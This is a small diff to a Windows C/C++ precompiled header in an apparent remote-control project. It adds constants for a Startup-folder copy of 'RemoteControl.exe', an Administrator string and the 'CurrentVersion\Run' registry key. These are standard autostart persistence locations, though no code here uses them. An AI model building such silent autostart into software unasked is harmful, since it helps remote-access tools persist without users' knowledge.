@@ -23,4 +23,8 @@
 #include "CommandHanle.h"
 #include "Pkt.h"
 
+#define STARTUP_PATH "C:\\Users\\moeby\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RemoteControl.exe"
+#define ADMIN L"Administrator"
+#define SUB_KEY "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
+
 #endif //PCH_H
